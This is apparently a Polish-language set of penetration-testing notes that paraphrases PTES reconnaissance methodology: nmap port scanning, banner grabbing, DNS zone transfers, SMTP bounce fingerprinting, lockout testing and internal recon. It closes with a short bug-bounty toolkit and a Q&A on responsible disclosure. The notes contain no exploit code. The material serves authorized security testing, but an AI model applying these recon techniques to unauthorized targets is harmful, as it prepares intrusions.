+Techniki skanowania portów będą się różnić w zależności od ilości czasu dostępnego na test i konieczności działania w ukryciu. Jeśli wiedza o systemach jest zerowa, do identyfikacji systemów można użyć szybkiego skanowania ping. Ponadto należy uruchomić szybkie skanowanie bez weryfikacji ping (-PN w nmap), aby wykryć najczęściej dostępne porty. Po zakończeniu można uruchomić bardziej kompleksowe skanowanie. Niektórzy testerzy sprawdzają tylko otwarte porty TCP, sprawdź również UDP. Dokument http://nmap.org/nmap_doc.html szczegółowo opisuje typy skanowania portów. Nmap („Network Mapper”) jest de facto standardem audytu/skanowania sieci. Nmap działa zarówno w systemie Linux, jak i Windows.
+
+Więcej informacji na temat wykorzystania Nmap do tego celu można znaleźć w Wytycznych technicznych PTES
+
+Nmap ma dziesiątki dostępnych opcji. Ponieważ ta sekcja dotyczy skanowania portów, skupimy się na poleceniach wymaganych do wykonania tego zadania. Należy zauważyć, że używane polecenia zależą głównie od czasu i liczby skanowanych hostów. Im więcej hostów lub mniej czasu masz na wykonanie tych zadań, tym mniej będziemy przesłuchiwać hosta. Stanie się to oczywiste, gdy będziemy kontynuować dyskusję na temat opcji.
+
+Należy również przetestować protokół IPv6.
+
+Łapanie sztandarów
+Przechwytywanie banerów to technika wyliczania używana do zbierania informacji o systemach komputerowych w sieci i usługach obsługujących jej otwarte porty. Przechwytywanie banerów służy do identyfikowania w sieci wersji aplikacji i systemu operacyjnego, na którym działa docelowy host.
+
+Przechwytywanie banerów jest zwykle wykonywane przy użyciu protokołów Hyper Text Transfer Protocol (HTTP), File Transfer Protocol (FTP) i Simple Mail Transfer Protocol (SMTP); odpowiednio porty 80, 21 i 25. Narzędzia powszechnie używane do przechwytywania banerów to Telnet, nmap i Netcat.
+
+Przeszukiwanie SNMP
+Wykonywane są również przeszukiwania SNMP, ponieważ oferują one mnóstwo informacji o konkretnym systemie. Protokół SNMP jest protokołem bezstanowym zorientowanym na datagramy. Niestety serwery SNMP nie odpowiadają na żądania z nieprawidłowymi ciągami społecznościowymi, a leżący u ich podstaw protokół UDP nie zgłasza niezawodnie zamkniętych portów UDP. Oznacza to, że „brak odpowiedzi” z sondowanego adresu IP może oznaczać jedną z następujących sytuacji:
+
+maszyna nieosiągalna
+Serwer SNMP nie działa
+nieprawidłowy ciąg społeczności
+datagram odpowiedzi jeszcze nie dotarł
+Transfery strefowe
+Transfer strefy DNS, znany również jako AXFR, to rodzaj transakcji DNS. Jest to mechanizm zaprojektowany do replikacji baz danych zawierających dane DNS w zestawie serwerów DNS. Transfer strefowy jest dostępny w dwóch wersjach: pełnej (AXFR) i przyrostowej (IXFR). Dostępnych jest wiele narzędzi do testowania możliwości wykonania transferu strefy DNS. Narzędzia powszechnie używane do wykonywania transferów stref to host, dig i nmap.
+
+Odbicie SMTP
+Odesłanie SMTP, zwane także raportem/potwierdzeniem niedostarczenia (NDR), (nieudanym) powiadomieniem o statusie doręczenia (DSN), powiadomieniem o niedostarczeniu (NDN) lub po prostu odbiciem, to automatyczna wiadomość e-mail od system pocztowy informujący nadawcę kolejnej wiadomości o problemie z dostarczeniem. Może to pomóc atakującemu w uzyskaniu odcisku palca serwera SMTP, ponieważ informacje o serwerze SMTP, w tym oprogramowanie i wersje, mogą być zawarte w odesłanej wiadomości.
+
+Można to zrobić, po prostu tworząc fałszywy adres w domenie celu. Na przykład asDFADSF_garbage_address@target.com może zostać użyty do przetestowania target.com. Gmail zapewnia pełny dostęp do nagłówków, dzięki czemu jest łatwym wyborem dla testerów.
+
+Wykrywanie DNS
+Wykrywanie DNS można przeprowadzić, przeglądając rekordy WHOIS dla autorytatywnego serwera nazw domeny. Dodatkowo należy sprawdzić wariacje nazwy domeny głównej, a także sprawdzić witrynę pod kątem odniesień do innych domen, które mogą znajdować się pod kontrolą celu.
+
+DNS do przodu/do tyłu
+Odwrotnego DNS można użyć do uzyskania prawidłowych nazw serwerów używanych w organizacji. Istnieje zastrzeżenie, że musi mieć rekord PTR (odwrotny) DNS, aby mógł rozpoznać nazwę z podanego adresu IP. Jeśli zostanie rozwiązany, wyniki zostaną zwrócone. Zwykle odbywa się to poprzez przetestowanie serwera z różnymi adresami IP, aby sprawdzić, czy zwraca jakieś wyniki.
+
+Bruteforce DNS
+Po zidentyfikowaniu wszystkich informacji związanych z domenami klienta nadszedł czas, aby rozpocząć wysyłanie zapytań do DNS. Ponieważ DNS jest używany do mapowania adresów IP na nazwy hostów i odwrotnie, będziemy chcieli sprawdzić, czy jest niepewnie skonfigurowany. Będziemy dążyć do wykorzystania DNS w celu ujawnienia dodatkowych informacji o kliencie. Jedną z najpoważniejszych błędnych konfiguracji związanych z DNS jest umożliwienie użytkownikom Internetu wykonania transferu strefy DNS. Istnieje kilka narzędzi, których możemy użyć do wyliczenia DNS, aby nie tylko sprawdzić możliwość wykonywania transferów stref, ale także potencjalnie wykryć dodatkowe nazwy hostów, które nie są powszechnie znane.
+
+Wykrywanie aplikacji internetowych
+Identyfikacja słabych aplikacji internetowych może być szczególnie owocnym zajęciem podczas testu penetracyjnego. Rzeczy, których należy szukać, obejmują aplikacje OTS, które zostały źle skonfigurowane, aplikacje OTS, które mają funkcjonalność wtyczek (wtyczki często zawierają bardziej podatny na ataki kod niż aplikacja podstawowa) oraz aplikacje niestandardowe. Odciski palców aplikacji internetowych, takie jak WAFP, mogą być tutaj używane z doskonałym skutkiem.
+
+Wykrywanie i wyliczanie wirtualnych hostów
+Serwery internetowe często obsługują wiele „wirtualnych” hostów w celu skonsolidowania funkcjonalności na jednym serwerze. Jeśli wiele serwerów wskazuje ten sam adres DNS, mogą one być hostowane na tym samym serwerze. Narzędzia, takie jak wyszukiwanie MSN, mogą być używane do mapowania adresu IP na zestaw hostów wirtualnych.
+
+Stwórz zewnętrzną listę docelową
+Po wykonaniu powyższych czynności należy sporządzić listę użytkowników, adresów e-mail, domen, aplikacji, hostów i usług.
+
+Wersje mapowania
+Sprawdzanie wersji to szybki sposób identyfikowania informacji o aplikacji. Do pewnego stopnia wersje usług można pobrać za pomocą nmap, a wersje aplikacji internetowych można często zebrać, patrząc na źródło dowolnej strony.
+
+Identyfikacja poziomów poprawek
+Aby wewnętrznie zidentyfikować poziom poprawek usług, rozważ użycie oprogramowania, które będzie badać system pod kątem różnic między wersjami. Poświadczenia mogą być używane w tej fazie testu penetracyjnego, pod warunkiem, że klient wyraził na to zgodę. Skanery luk w zabezpieczeniach są szczególnie skuteczne w zdalnym identyfikowaniu poziomów poprawek bez poświadczeń.
+
+Szukam słabych aplikacji internetowych
+Identyfikacja słabych aplikacji internetowych może być szczególnie owocnym zajęciem podczas testu penetracyjnego. Rzeczy, których należy szukać, obejmują aplikacje OTS, które zostały źle skonfigurowane, aplikacje OTS, które mają funkcjonalność wtyczek (wtyczki często zawierają bardziej podatny na ataki kod niż aplikacja podstawowa) oraz aplikacje niestandardowe. Odciski palców aplikacji internetowych, takie jak WAFP, mogą być tutaj używane z doskonałym skutkiem.
+
+
+Zidentyfikuj próg blokady
+Zidentyfikowanie progu blokady usługi uwierzytelniania pozwoli upewnić się, że ataki bruteforce nie blokują celowo ważnych użytkowników podczas testowania. Zidentyfikuj wszystkie różne usługi uwierzytelniania w środowisku i przetestuj pojedyncze, nieszkodliwe konto pod kątem blokady. Często wystarczy 5 - 10 prób prawidłowego konta, aby ustalić, czy usługa zablokuje użytkowników.
+
+Ślad wewnętrzny
+Rekonesans pasywny
+Jeśli tester ma dostęp do sieci wewnętrznej, wąchanie pakietów może dostarczyć wielu informacji. Użyj technik, takich jak te zaimplementowane w p0f, aby zidentyfikować systemy.
+
+Zidentyfikuj wewnętrzne zakresy klientów
+Podczas przeprowadzania testów wewnętrznych najpierw wylicz swoją lokalną podsieć, a następnie często możesz ekstrapolować stamtąd do innych podsieci, nieznacznie modyfikując adres. Spojrzenie na tablicę routingu hosta wewnętrznego może być szczególnie wymowne. Poniżej znajduje się kilka technik, które można zastosować.
+
+Serwery DHCP mogą być potencjalnym źródłem nie tylko informacji lokalnych, ale także zdalnych zakresów adresów IP i szczegółów ważnych hostów. Większość serwerów DHCP zapewnia lokalny adres bramy IP, a także adresy serwerów DNS i WINS. W sieciach opartych na systemie Windows serwery DNS są zazwyczaj kontrolerami domeny usługi Active Directory, a zatem obiektami zainteresowania.
+
+Aktywny rozpoznanie
+Wewnętrzny rekonesans aktywny powinien zawierać wszystkie elementy zewnętrznego, a dodatkowo powinien koncentrować się na funkcjonalnościach intranetowych takich jak:
+
+Usługi katalogowe (Active Directory, Novell, Sun itp.)
+Witryny intranetowe zapewniające funkcjonalność biznesową
+Aplikacje korporacyjne (ERP, CRM, Księgowość itp.)
+Identyfikacja wrażliwych segmentów sieci (księgowość, R&D, marketing itp.)
+Mapowanie dostępu do sieci produkcyjnych (centra danych)
+Infrastruktura VoIP
+Udostępnianie uwierzytelniania (kerberos, tokeny plików cookie itp.)
+Zarządzanie serwerem proxy i dostępem do Internetu
+
+Zidentyfikuj mechanizmy ochrony
+Należy zidentyfikować i zmapować następujące elementy zgodnie z odpowiednią lokalizacją/grupą/osobami objętymi zakresem. Umożliwi to prawidłowe zastosowanie badań i wykorzystania luk w zabezpieczeniach podczas przeprowadzania rzeczywistego ataku - maksymalizując w ten sposób skuteczność ataku i minimalizując współczynnik wykrywalności.
+
+Zabezpieczenia oparte na sieci
+„Proste” filtry pakietów
+Urządzenia kształtujące ruch
+Systemy DLP
+Szyfrowanie/tunelowanie
+
+Zabezpieczenia oparte na hoście
+Zabezpieczenia stosu/sterty
+Biała lista aplikacji
+AV/filtrowanie/analiza behawioralna
+Systemy DLP
+
+Zabezpieczenia na poziomie aplikacji
+Zidentyfikuj zabezpieczenia aplikacji
+Opcje kodowania
+Potencjalne obwodnice
+Strony z białej listy
+
+Zabezpieczenia pamięci masowej
+HBA — poziom hosta
+Maskowanie LUN
+Kontroler pamięci masowej
+Sekret iSCSI CHAP
+
+Ochrona użytkownika
+Oprogramowanie do filtrowania AV/spamu
+Konfiguracja SW, która ogranicza możliwości wykorzystania, może być uznana za antyspamową/antyAV
+----------------------------------------------------------
+
+
+**Zestaw narzędzi
+Przyznaję, że nie używam wielu narzędzi, przez większość czasu piszę szybki skrypt PHP/Python. Powinienem, dzięki temu moje sesje byłyby bardziej wydajne, ale to są te podstawowe, z których korzystam cały czas.
+
+Należy zauważyć, że automatyczne skanery (takie jak Acunetix lub Nikto) generują dużo hałasu. Większość programów zabrania ich używania z tego powodu. Poza tym jest bardzo mało prawdopodobne, że za pomocą takiego skanera znajdziesz coś, czego nikt inny nie znalazł.
+
+Burp Suite — przechwytujący serwer proxy, który umożliwia modyfikowanie żądań w locie, powtarzanie żądań i tak dalej.
+Nmap - Przydatny do wyszukiwania dodatkowych serwerów WWW do zbadania (pod warunkiem, że zakres programu jest wystarczająco szeroki)
+Wykrywanie DNS — znajdź dodatkowe subdomeny do zbadania**
+
+
+Na czym polega wykrywanie exploitów 0-day?
+
+O. Czasem znalezienie luk w zabezpieczeniach jest łatwe, czasem wymaga to dużo więcej pracy. To zawsze zależy od tego, czego szukasz. Znalezienie luki w zabezpieczeniach takiej jak Cross Site Scripting (XSS) w witrynie internetowej i exploitów dla niej jest niezwykle łatwe i nie wymaga automatycznych narzędzi; możesz to zrobić ręcznie.
+
+P. Jak zdobywasz informacje? Czy zaczyna się od podpowiedzi, czy to tylko kwestia pogłębiania kodu w poszukiwaniu dziur?
+
+O. Czasami po prostu wpadamy na pomysł i testujemy go, ale innym razem czytamy fora hakerów, aby dowiedzieć się, czego szukają nasi koledzy i jakie nowe exploity są opracowywane i wprowadzane na rynek. Dlatego tak ważne jest odpowiedzialne ujawnianie informacji. Jeśli miałbym opublikować na forum hakerskim informację o luce, którą odkryłem w konkretnej witrynie, cała grupa hakerów zacznie przeglądać tę witrynę i znajdować inne luki. To jak polowanie na trofea. Ważne jest, aby dać odpowiedniej firmie możliwość załatania wszelkich luk w zabezpieczeniach przed ujawnieniem wyników badań.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
